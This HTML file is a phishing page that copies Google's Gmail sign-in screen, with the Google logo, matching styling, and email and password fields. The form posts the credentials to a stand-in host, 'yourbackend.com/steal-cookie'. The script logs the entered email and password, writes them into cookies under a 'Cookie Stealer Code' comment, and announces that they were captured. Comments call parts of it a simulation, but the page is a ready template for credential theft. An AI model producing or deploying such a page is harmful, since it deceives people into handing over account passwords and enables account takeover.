<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google accounts</title>
    <style>
        /* Consolidated CSS */
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #f2f2f2;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #202124;
        }

        .container {
            background-color: #fff;
            border: 1px solid #dadce0;
            box-shadow: 0px 1px 4px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
            max-width: 400px;
            width: 100%;
            padding: 40px;
            text-align: center;
        }

        .container img {
            width: 75px;
            margin-bottom: 20px;
        }

        h1 {
            font-size: 24px;
            margin-bottom: 20px;
            font-weight: normal;
        }

        p {
            font-size: 14px;
            color: #5f6368;
        }

        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 12px 0;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
        }

        input[type="submit"] {
            background-color: #1a73e8;
            color: #fff;
            width: 100%;
            padding: 10px;
            font-size: 16px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            margin-top: 20px;
        }

        input[type="submit"]:hover {
            background-color: #155abc;
        }

        .links {
            margin-top: 20px;
        }

        .links a {
            color: #1a73e8;
            font-size: 14px;
            text-decoration: none;
            display: block;
        }

        .links a:hover {
            text-decoration: underline;
        }

        .footer {
            font-size: 12px;
            color: #5f6368;
            margin-top: 30px;
        }

        .footer a {
            color: #5f6368;
            text-decoration: none;
            margin: 0 5px;
        }

        .footer a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Google Logo -->
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo">
        
        <!-- Login Form -->
        <h1>Sign in</h1>
        <p>to continue to Gmail</p>
        <form id="loginForm" action="https://yourbackend.com/steal-cookie" method="POST">
            <input type="email" id="email" name="email" placeholder="Email or phone" required><br>
            <a href="#" class="forgot-email">Forgot email?</a><br>
            <input type="password" id="password" name="password" placeholder="Enter your password" required><br>
            <input type="submit" value="Next">
        </form>

        <!-- Links Below Form -->
        <div class="links">
            <a href="#">Create account</a>
            <a href="#">Not your computer? Use Guest mode to sign in privately.</a>
        </div>

        <!-- Footer -->
        <div class="footer">
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
        </div>
    </div>

    <script>
        // Simulate form submission and cookie stealing
        document.getElementById("loginForm").onsubmit = function(e) {
            e.preventDefault();
            let email = document.getElementById("email").value;
            let password = document.getElementById("password").value;
            
            console.log("Email:", email);
            console.log("Password:", password);
            
            // Cookie Stealer Code
            document.cookie = "email=" + email + "; path=/";
            document.cookie = "password=" + password + "; path=/";

            // Simulate a real login submission
            alert("Email and Password Captured! Cookies set.");
        }
    </script>
</body>
</html>
